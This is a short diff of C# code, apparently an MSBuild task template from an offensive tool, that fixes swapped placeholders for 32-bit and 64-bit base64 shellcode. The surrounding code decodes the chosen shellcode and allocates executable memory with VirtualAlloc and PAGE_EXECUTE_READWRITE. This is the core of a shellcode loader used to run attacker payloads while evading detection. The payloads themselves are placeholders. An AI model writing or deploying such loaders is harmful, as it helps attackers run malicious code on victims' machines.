@@ -20,8 +20,8 @@ private static UInt32 MEM_COMMIT = 0x1000;private static UInt32 PAGE_EXECUTE_REA
 public override bool Execute()
 {
 string pw = "#REPLACEMERANDSTRING#";
-string shell64 = "#REPLACEME32#";
-string shell32 = "#REPLACEME64#";
+string shell64 = "#REPLACEME64#";
+string shell32 = "#REPLACEME32#";
 byte[] shellcode = null;
 if (IntPtr.Size == 4){shellcode = System.Convert.FromBase64String(shell32);} else {shellcode = System.Convert.FromBase64String(shell64);}
 IntPtr funcAddr = VirtualAlloc(0, (uint)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
